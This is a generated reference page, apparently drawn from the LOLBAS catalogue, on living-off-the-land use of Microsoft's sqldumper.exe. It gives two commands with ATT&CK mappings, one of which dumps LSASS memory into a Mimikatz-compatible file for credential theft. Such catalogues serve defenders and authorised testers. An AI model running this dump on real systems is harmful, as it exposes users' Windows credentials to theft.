---
parsed_by: focuslocust
source: commands
type: generated
---
# Sqldumper Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Sqldumper.exe

Tool page: [Sqldumper.exe](../../tools/windows/sqldumper.exe.md)

### Dump process using PID.

```text
sqldumper.exe 464 0 0x0110
```

Description:

Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).

Related ATT&CK:

- [T1003](../../attack/techniques/T1003-os-credential-dumping.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Sqldumper.yml` |
| Evidence | Command preserved from source parser. |

### Dump LSASS.exe to Mimikatz compatible dump using PID.

```text
sqldumper.exe 540 0 0x01100:40
```

Description:

0x01100:40 flag will create a Mimikatz compatible dump file.

Related ATT&CK:

- [T1003.001](../../attack/techniques/T1003.001-lsass-memory.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Sqldumper.yml` |
| Evidence | Command preserved from source parser. |
